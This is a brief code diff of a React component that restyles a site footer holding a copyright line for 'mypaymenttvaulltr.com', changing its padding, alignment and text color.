-      <div style={{ width: "100%", maxWidth: 680, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
-        <span style={{ fontSize: 11, color: "#888" }}>
-          &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
-        </span>
+        <div style={{ padding: "12px 28px 20px", textAlign: "center" }}>
+          <span style={{ fontSize: 11, color: "#ccc" }}>
+            &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
+          </span>
+        </div>
       </div>
-
     </div>
   );
 }
